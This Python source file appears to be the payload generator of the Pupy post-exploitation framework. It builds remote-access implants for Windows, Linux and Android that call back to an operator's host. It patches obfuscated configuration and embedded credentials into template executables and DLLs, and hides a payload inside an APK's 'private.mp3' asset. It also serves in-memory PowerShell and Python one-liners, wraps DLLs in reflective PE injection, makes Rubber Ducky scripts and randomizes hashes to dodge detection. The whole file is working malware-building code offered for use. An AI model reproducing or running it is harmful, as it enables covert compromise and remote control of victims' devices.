#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

import logging, argparse, sys, os.path, re, shlex, random, string, zipfile, tarfile, tempfile, shutil, subprocess, traceback, pkgutil
from pupylib.utils.network import get_local_ip
from pupylib.utils.term import colorize
from pupylib.payloads.python_packer import gen_package_pickled_dic
from pupylib.payloads.py_oneliner import serve_payload, pack_py_payload, getLinuxImportedModules
from pupylib.payloads.rubber_ducky import rubber_ducky
from pupylib.utils.obfuscate import compress_encode_obfs
from network.conf import transports, launchers
from network.lib.base_launcher import LauncherError
from scriptlets.scriptlets import ScriptletArgumentError
from modules.lib.windows.powershell_upload import obfuscatePowershellScript
import scriptlets
import cPickle
import base64
import os

ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__)))


def get_edit_pupyx86_dll(conf, debug=False):
    if debug:
        return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86d.dll"), conf)
    return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86.dll"), conf)

def get_edit_pupyx64_dll(conf, debug=False):
    if debug:
        return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64d.dll"), conf)
    return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64.dll"), conf)

def get_edit_pupyx86_exe(conf, debug=False):
    if debug:
        return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86d.exe"), conf)
    return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86.exe"), conf)

def get_edit_pupyx64_exe(conf, debug=False):
    if debug:
        return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64d.exe"), conf)
    return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64.exe"), conf)

def get_edit_pupyx86_lin(conf, debug=False):
    if debug:
        return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86d.lin"), conf)
    return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86.lin"), conf)

def get_edit_pupyx64_lin(conf, debug=False):
    if debug:
        return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64d.lin"), conf)
    return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64.lin"), conf)

def get_edit_pupyx86_so(conf, debug=False):
    if debug:
        return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86d.so"), conf)
    return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86.so"), conf)

def get_edit_pupyx64_so(conf, debug=False):
    if debug:
        return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64d.so"), conf)
    return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64.so"), conf)

def get_edit_binary(path, conf):
    logging.debug("generating binary %s with conf: %s"%(path, conf))
    binary=b""
    with open(path, 'rb') as f:
        binary=f.read()
    i=0
    offsets=[]
    while True:
        i=binary.find("####---PUPY_CONFIG_COMES_HERE---####\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", i+1)
        if i==-1:
            break
        offsets.append(i)

    if not offsets:
        raise Exception("Error: the offset to edit the config have not been found")
    elif len(offsets)!=1:
        raise Exception("Error: multiple offsets to edit the config have been found")

    new_conf=get_raw_conf(conf, obfuscate=True)
    new_conf+="\n\x00\x00\x00\x00\x00\x00\x00\x00"
    if len(new_conf)>40960-1:
        raise Exception("Error: config or offline script too long (%s/40960 bytes)\nYou need to recompile the dll with a bigger buffer"%len(new_conf))
    binary=binary[0:offsets[0]]+new_conf+binary[offsets[0]+len(new_conf):]
    return binary

def get_credential(name):
    creds_src=open("crypto/credentials.py","r").read()
    creds={}
    exec creds_src in {}, creds
    if name in creds:
        return creds[name]
    return None

def get_raw_conf(conf, obfuscate=False):
    if not "offline_script" in conf:
        offline_script=""
    else:
        offline_script=conf["offline_script"]
    new_conf=""
    obf_func=lambda x:x
    if obfuscate:
        obf_func=compress_encode_obfs


    l=launchers[conf['launcher']]()
    l.parse_args(conf['launcher_args'])
    t=transports[l.get_transport()]

    #pack credentials
    creds_src=open("crypto/credentials.py","r").read()
    creds={}
    exec creds_src in {}, creds
    cred_src=b""
    creds_list=t.credentials
    if conf['launcher']=="bind":
        creds_list.append("BIND_PAYLOADS_PASSWORD")

    if conf['launcher']!="bind": #TODO more flexible warning handling
        if "SSL_BIND_KEY" in creds_list:
            creds_list.remove("SSL_BIND_KEY")
        if "SSL_BIND_CERT" in creds_list:
            creds_list.remove("SSL_BIND_CERT")

    for c in creds_list:
        if c in creds:
            print colorize("[+] ", "green")+"Embedding credentials %s"%c
            cred_src+=obf_func("%s=%s"%(c, repr(creds[c])))+"\n"
        else:
            print colorize("[!] ", "yellow")+"[-] Credential %s have not been found for transport %s. Fall-back to default credentials. You should edit your crypto/credentials.py file"%(c, l.get_transport())
    pupy_credentials_mod={"pupy_credentials.py" : cred_src}

    new_conf+=compress_encode_obfs("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(pupy_credentials_mod)))+"\n"

    #pack custom transport conf:
    l.get_transport()
    transport_conf_dic=gen_package_pickled_dic(ROOT+os.sep, "network.transports.%s"%l.get_transport())
    #add custom transport and reload network conf
    new_conf+=compress_encode_obfs("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(transport_conf_dic)))+"\nimport sys\nsys.modules.pop('network.conf')\nimport network.conf\n"


    new_conf+=obf_func("LAUNCHER=%s"%(repr(conf['launcher'])))+"\n"
    new_conf+=obf_func("LAUNCHER_ARGS=%s"%(repr(conf['launcher_args'])))+"\n"
    new_conf+=offline_script
    new_conf+="\n"

    return new_conf


def updateZip(zipname, filename, data):
    # generate a temp file
    tmpfd, tmpname = tempfile.mkstemp(dir=os.path.dirname(zipname))
    os.close(tmpfd)

    # create a temp copy of the archive without filename
    with zipfile.ZipFile(zipname, 'r') as zin:
        with zipfile.ZipFile(tmpname, 'w') as zout:
            zout.comment = zin.comment # preserve the comment
            for item in zin.infolist():
                if item.filename != filename:
                    zout.writestr(item, zin.read(item.filename))

    # replace with the temp archive
    os.remove(zipname)
    os.rename(tmpname, zipname)

    # now add filename with its new data
    with zipfile.ZipFile(zipname, mode='a', compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(filename, data)

def updateTar(arcpath, arcname, file_path):
    tempdir=tempfile.mkdtemp(prefix="tmp_pupy_")
    try:
        with tarfile.open(arcpath, 'r') as tfr:
            names=tfr.getnames()
            tfr.extractall(tempdir)
            for root, dirs, files in os.walk(tempdir):
                for dir in dirs:
                    os.chmod(os.path.join(root, dir), 0700)
                for file in files:
                    os.chmod(os.path.join(root, file), 0600)

            with tarfile.open(arcpath+"2", 'w:gz') as tfw:
                for n in names:
                    #print "adding %s"%n
                    if n!=arcname:
                        tfw.add(os.path.join(tempdir, n), arcname=n, recursive=False)
                    else:
                        tfw.add(file_path, arcname=n, recursive=False)
        shutil.copy(arcpath+"2", arcpath)
    finally:
        shutil.rmtree(tempdir)

def get_edit_apk(path, new_path, conf):
    tempdir=tempfile.mkdtemp(prefix="tmp_pupy_")
    try:
        packed_payload=pack_py_payload(get_raw_conf(conf))
        shutil.copy(path, new_path)

        #extracting the python-for-android install tar from the apk
        zf=zipfile.ZipFile(path,'r')
        zf.extract("assets/private.mp3", tempdir)
        zf.close()

        with open(os.path.join(tempdir,"pp.py"),'w') as w:
            w.write(packed_payload)
        import py_compile
        py_compile.compile(os.path.join(tempdir, "pp.py"), os.path.join(tempdir, "pp.pyo"))

        print "[+] packaging the apk ... (can take 10-20 seconds)"
        #updating the tar with the new config
        updateTar(os.path.join(tempdir,"assets/private.mp3"), "service/pp.pyo", os.path.join(tempdir,"pp.pyo"))
        #repacking the tar in the apk
        with open(os.path.join(tempdir,"assets/private.mp3"), 'r') as t:
            updateZip(new_path, "assets/private.mp3", t.read())

        #signing the tar
        try:
            res=subprocess.check_output("jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore crypto/pupy-apk-release-key.keystore -storepass pupyp4ssword '%s' pupy_key"%new_path, shell=True)
        except OSError as e:
            if e.errno ==os.errno.ENOENT:
                print "Please install jarsigner first."
                sys.exit(1)
            raise e
        # -tsa http://timestamp.digicert.com
        print(res)
    finally:
        #cleaning up
        shutil.rmtree(tempdir, ignore_errors=True)

def load_scriptlets():
    scl={}
    for loader, module_name, is_pkg in pkgutil.iter_modules(scriptlets.__path__):
        if is_pkg:
            module=loader.find_module(module_name).load_module(module_name)
            for loader2, module_name2, is_pkg2 in pkgutil.iter_modules(module.__path__):
                if module_name2=="generator":
                    module2=loader2.find_module(module_name2).load_module(module_name2)
                    if not hasattr(module2, 'ScriptletGenerator'):
                        logging.error("scriptlet %s has no class ScriptletGenerator"%module_name2)
                    else:
                        scl[module_name]=module2.ScriptletGenerator
    return scl

def parse_scriptlets(args_scriptlet, debug=False):
    scriptlets_dic=load_scriptlets()
    sp=scriptlets.scriptlets.ScriptletsPacker(debug=debug)
    for sc in args_scriptlet:
        tab=sc.split(",",1)
        sc_args={}
        name=tab[0]
        if len(tab)==2:
            try:
                for x,y in [x.strip().split("=") for x in tab[1].split(",")]:
                    sc_args[x.strip()]=y.strip()
            except:
                print("usage: pupygen ... -s %s,arg1=value,arg2=value,..."%name)
                exit(1)

        if name not in scriptlets_dic:
            print(colorize("[-] ","red")+"unknown scriptlet %s, valid choices are : %s"%(repr(name), [x for x in scriptlets_dic.iterkeys()]))
            exit(1)
        print colorize("[+] ","green")+"loading scriptlet %s with args %s"%(repr(name), sc_args)
        try:
            sp.add_scriptlet(scriptlets_dic[name](**sc_args))
        except ScriptletArgumentError as e:
            print(colorize("[-] ","red")+"Scriptlet %s argument error : %s"%(repr(name),str(e)))
            print("")
            print("usage: pupygen.py ... -s %s,arg1=value,arg2=value,... ..."%name)
            scriptlets_dic[name].print_help()

            exit(1)
    script_code=sp.pack()
    return script_code

class ListOptions(argparse.Action):
    def __call__(self, parser, namespace, values, option_string=None):
        print colorize("## available formats :", "green")+" usage: -f <format>"
        print "\t- exe_86, exe_x64  : generate PE exe for windows"
        print "\t- dll_86, dll_x64  : generate reflective dll for windows"
        print "\t- lin_x86, lin_x64 : generate a ELF binary for linux"
        print "\t- so_x86, so_x64   : generate a ELF .so for linux"
        print "\t- py               : generate a fully packaged python file (with all the dependencies packaged and executed from memory), all os (need the python interpreter installed)"
        print "\t- pyinst           : generate a python file compatible with pyinstaller"
        print "\t- py_oneliner      : same as \"py\" format but served over http to load it from memory with a single command line."
        print "\t- ps1              : generate ps1 file which embeds pupy dll (x86-x64) and inject it to current process."
        print "\t- ps1_oneliner     : load pupy remotely from memory with a single command line using powershell."
        print "\t- rubber_ducky     : generate a Rubber Ducky script and inject.bin file (Windows Only)."
        print "\t- apk              : generate a apk for running pupy on android"

        print ""
        print colorize("## available transports :","green")+" usage: -t <transport>"
        for name, tc in transports.iteritems():
            try:
                print "\t- {:<14} : {}".format(name, tc.info)
            except Exception as e:
                logging.error(e)

        print colorize("## available scriptlets :", "green")+" usage: -s <scriptlet>,<arg1>=<value>,<args2=value>..."
        scriptlets_dic=load_scriptlets()
        for name, sc in scriptlets_dic.iteritems():
            print "\t- {:<15} : ".format(name)
            print '\n'.join(["\t"+x for x in sc.get_help().split("\n")])
        exit()

PAYLOAD_FORMATS=['apk', 'lin_x86', 'lin_x64', 'so_x86', 'so_x64', 'exe_x86', 'exe_x64', 'dll_x86', 'dll_x64', 'py', 'pyinst', 'py_oneliner', 'ps1', 'ps1_oneliner', 'rubber_ducky']
if __name__=="__main__":
    parser = argparse.ArgumentParser(description='Generate payloads for windows, linux, osx and android.')
    parser.add_argument('-f', '--format', default='exe_x86', choices=PAYLOAD_FORMATS, help="(default: exe_x86)")
    parser.add_argument('-o', '--output', help="output path")
    parser.add_argument('-s', '--scriptlet', default=[], action='append', help="offline python scriptlets to execute before starting the connection. Multiple scriptlets can be privided.")
    parser.add_argument('-l', '--list', action=ListOptions, nargs=0, help="list available formats, transports, scriptlets and options")
    parser.add_argument('-i', '--interface', default=None, help="The default interface to listen on")
    parser.add_argument('--no-use-proxy', action='store_true', help="Don't use the target's proxy configuration even if it is used by target (for ps1_oneliner only for now)")
    parser.add_argument('--ps1-oneliner-listen-port', default=8080, type=int, help="Port used by ps1_oneliner listener (default: %(default)s)")
    parser.add_argument('--randomize-hash', action='store_true', help="add a random string in the exe to make it's hash unknown")
    parser.add_argument('--debug-scriptlets', action='store_true', help="don't catch scriptlets exceptions on the client for debug purposes")
    parser.add_argument('--debug', action='store_true', help="build with the debug template (the payload open a console)")
    parser.add_argument('--workdir', help='Set Workdir (Default = current workdir)')
    parser.add_argument('launcher', choices=[x for x in launchers.iterkeys()], default='auto_proxy', help="Choose a launcher. Launchers make payloads behave differently at startup.")
    parser.add_argument('launcher_args', nargs=argparse.REMAINDER, help="launcher options")

    args=parser.parse_args()

    if args.workdir:
        os.chdir(args.workdir)

    script_code=""
    if args.scriptlet:
        script_code=parse_scriptlets(args.scriptlet, debug=args.debug_scriptlets)


    l=launchers[args.launcher]()
    while True:
        try:
            l.parse_args(args.launcher_args)
        except LauncherError as e:
            if str(e).strip().endswith("--host is required") and not "--host" in args.launcher_args:
                myip=get_local_ip(args.interface)
                if not myip:
                    sys.exit("[-] --host parameter missing and couldn't find your local IP. You must precise an ip or a fqdn manually")
                print(colorize("[!] required argument missing, automatically adding parameter --host %s:443 from local ip address"%myip,"grey"))
                args.launcher_args.insert(0,"%s:443"%myip)
                args.launcher_args.insert(0,"--host")
            else:
                l.arg_parser.print_usage()
                exit(str(e))
        else:
            break
    if args.randomize_hash:
        script_code+="\n#%s\n"%''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(40))
    conf={}
    conf['launcher']=args.launcher
    conf['launcher_args']=args.launcher_args
    conf['offline_script']=script_code
    outpath=args.output
    if args.format=="exe_x86":
        binary=get_edit_pupyx86_exe(conf, debug=args.debug)
        if not outpath:
            outpath="pupyx86.exe"
        with open(outpath, 'wb') as w:
            w.write(binary)
    elif args.format=="lin_x86":
        binary=get_edit_pupyx86_lin(conf, debug=args.debug)
        if not outpath:
            outpath="pupyx86.lin"
        with open(outpath, 'wb') as w:
            w.write(binary)
        os.chmod(outpath, 0711)
    elif args.format=="so_x86":
        binary=get_edit_pupyx86_lin(conf, debug=args.debug)
        if not outpath:
            outpath="pupyx86.so"
        with open(outpath, 'wb') as w:
            w.write(binary)
        os.chmod(outpath, 0711)
    elif args.format=="lin_x64":
        binary=get_edit_pupyx64_lin(conf, debug=args.debug)
        if not outpath:
            outpath="pupyx64.lin"
        with open(outpath, 'wb') as w:
            w.write(binary)
        os.chmod(outpath, 0711)
    elif args.format=="so_x64":
        binary=get_edit_pupyx64_lin(conf, debug=args.debug)
        if not outpath:
            outpath="pupyx64.so"
        with open(outpath, 'wb') as w:
            w.write(binary)
        os.chmod(outpath, 0711)
    elif args.format=="exe_x64":
        binary=get_edit_pupyx64_exe(conf, debug=args.debug)
        if not outpath:
            outpath="pupyx64.exe"
        with open(outpath, 'wb') as w:
            w.write(binary)
    elif args.format=="dll_x64":
        binary=get_edit_pupyx64_dll(conf, debug=args.debug)
        if not outpath:
            outpath="pupyx64.dll"
        with open(outpath, 'wb') as w:
            w.write(binary)
    elif args.format=="dll_x86":
        binary=get_edit_pupyx86_dll(conf, debug=args.debug)
        if not outpath:
            outpath="pupyx86.dll"
        with open(outpath, 'wb') as w:
            w.write(binary)
    elif args.format=="apk":
        if not outpath:
            outpath="pupy.apk"
        get_edit_apk(os.path.join(ROOT, "payload_templates","pupy.apk"), outpath, conf)
    elif args.format=="py" or args.format=="pyinst":
        linux_modules = ""
        if not outpath:
            outpath="payload.py"
        if args.format=="pyinst" :
            linux_modules = getLinuxImportedModules()
        packed_payload=pack_py_payload(get_raw_conf(conf))
        with open(outpath, 'wb') as w:
            w.write("#!/usr/bin/env python\n# -*- coding: UTF8 -*-\n"+linux_modules+"\n"+packed_payload)
    elif args.format=="py_oneliner":
        packed_payload=pack_py_payload(get_raw_conf(conf))
        i=conf["launcher_args"].index("--host")+1
        link_ip=conf["launcher_args"][i].split(":",1)[0]
        serve_payload(packed_payload, link_ip=link_ip)
    elif args.format=="ps1":
        SPLIT_SIZE = 100000
        x64InitCode, x86InitCode, x64ConcatCode, x86ConcatCode = "", "", "", ""
        if not outpath:
            outpath="payload.ps1"
        code = """
        $PEBytes = ""
        if ([IntPtr]::size -eq 4){{
            {0}
            $PEBytesTotal = [System.Convert]::FromBase64String({1})
        }}
        else{{
            {2}
            $PEBytesTotal = [System.Convert]::FromBase64String({3})
        }}
        Invoke-ReflectivePEInjection -PEBytes $PEBytesTotal -ForceASLR
        """#{1}=x86dll, {3}=x64dll
        binaryX64=base64.b64encode(get_edit_pupyx64_dll(conf))
        binaryX86=base64.b64encode(get_edit_pupyx86_dll(conf))
        binaryX64parts = [binaryX64[i:i+SPLIT_SIZE] for i in range(0, len(binaryX64), SPLIT_SIZE)]
        binaryX86parts = [binaryX86[i:i+SPLIT_SIZE] for i in range(0, len(binaryX86), SPLIT_SIZE)]
        for i,aPart in enumerate(binaryX86parts):
            x86InitCode += "$PEBytes{0}=\"{1}\"\n".format(i,aPart)
            x86ConcatCode += "$PEBytes{0}+".format(i)
        print(colorize("[+] ","green")+"X86 dll loaded and {0} variables used".format(i+1))
        for i,aPart in enumerate(binaryX64parts):
            x64InitCode += "$PEBytes{0}=\"{1}\"\n".format(i,aPart)
            x64ConcatCode += "$PEBytes{0}+".format(i)
        print(colorize("[+] ","green")+"X64 dll loaded and {0} variables used".format(i+1))
        script = obfuscatePowershellScript(open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read())
        with open(outpath, 'wb') as w:
            w.write("{0}\n{1}".format(script, code.format(x86InitCode, x86ConcatCode[:-1], x64InitCode, x64ConcatCode[:-1]) ))
    elif args.format=="ps1_oneliner":
        from pupylib.payloads.ps1_oneliner import serve_ps1_payload
        link_ip=conf["launcher_args"][conf["launcher_args"].index("--host")+1].split(":",1)[0]
        if args.no_use_proxy == True:
            serve_ps1_payload(conf, link_ip=link_ip, port=args.ps1_oneliner_listen_port, useTargetProxy=False)
        else:
            serve_ps1_payload(conf, link_ip=link_ip, port=args.ps1_oneliner_listen_port, useTargetProxy=True)
    elif args.format=="rubber_ducky":
        rubber_ducky(conf).generateAllForOStarget()
    else:
        exit("Type %s is invalid."%(args.format))
    print(colorize("[+] ","green")+"payload successfully generated with config :")
    print("OUTPUT_PATH = %s"%os.path.abspath(outpath))
    print("LAUNCHER = %s"%repr(args.launcher))
    print("LAUNCHER_ARGS = %s"%repr(args.launcher_args))
    print("SCRIPTLETS = %s"%args.scriptlet)
    print("DEBUG = %s"%args.debug)
